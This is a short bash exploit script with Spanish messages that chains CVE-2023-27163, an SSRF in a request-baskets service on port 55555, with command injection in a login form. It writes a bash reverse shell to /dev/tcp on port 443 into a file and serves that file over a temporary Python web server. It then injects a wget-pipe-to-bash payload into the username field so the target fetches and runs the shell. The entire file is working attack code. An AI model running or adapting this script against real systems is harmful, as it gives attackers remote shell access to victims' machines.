#!/bin/bash
#
usage(){
  /usr/bin/echo "Uso: $0 -i <direccion IP vict> [-p <numero de puerto>] -f <IP:PORT forward> -t <IP interfaz>"
  exit 1
}

cve_2023_27163(){
  /usr/bin/echo -e "\n$url\n"
  /usr/bin/curl --location "$url" --header 'Content-Type: application/json' --data '{"forward_url": "http://'"$ip_forward"'", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
  /usr/bin/echo "bash -i >& /dev/tcp/$interfaz_tun/443 0>&1" > rev.sh
}

rce_end(){
  sleep 3
  /usr/bin/echo -e "\n$url2\n"
  /usr/bin/python3 -m http.server 8080 2>/dev/null &
  id_python3=$!
  sleep 2
  /usr/bin/curl "$url2/login" --data 'username=;`wget -qO- '"$interfaz_tun:8080/rev.sh"' | bash`' > /dev/null 2>&1
  sleep 8
  kill -9 $id_python3
}

direccion_ip=""
numero_port=""
# Procesado Opciones
while getopts ":i:p:f:t:" opt; do
  case $opt in
    i)
      direccion_ip=$OPTARG;;
    p)
      numero_port=$OPTARG;;
    f)
      ip_forward=$OPTARG;;
    t)
      interfaz_tun=$OPTARG;;
    \?)
      echo "Opcione invalida: - $OPTARG"
      usage;;
    :)
      echo "La opcion -$OPTARG requiere un argumento."
      usage;;
  esac
done

if [ -z "$direccion_ip" ] || [ -z "$ip_forward" ]; then
  echo "Error: Debe proporcionar la direccion IP y IP Forward."
  usage
else
  num_ramdom=$((RANDOM/10))
  url="http://$direccion_ip:55555/api/baskets/$num_ramdom"
  url2="http://$direccion_ip:55555/$num_ramdom"
  cve_2023_27163
  rce_end
fi
